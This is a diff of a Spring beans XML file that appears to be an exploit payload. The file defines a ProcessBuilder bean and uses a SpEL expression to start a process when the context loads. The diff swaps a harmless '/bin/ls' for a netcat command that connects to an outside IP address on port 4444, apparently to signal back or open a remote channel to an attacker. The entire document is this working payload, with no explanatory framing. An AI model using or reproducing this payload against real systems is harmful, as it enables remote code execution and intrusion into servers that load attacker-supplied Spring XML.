@@ -5,7 +5,7 @@
      http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
   <bean id="pb" class="java.lang.ProcessBuilder">
-     <constructor-arg value="/bin/ls" />
+     <constructor-arg value="/bin/nc -nv 206.189.66.196 4444" />
      <property name="whatever" value="#{ pb.start() }"/>
   </bean>
 </beans>
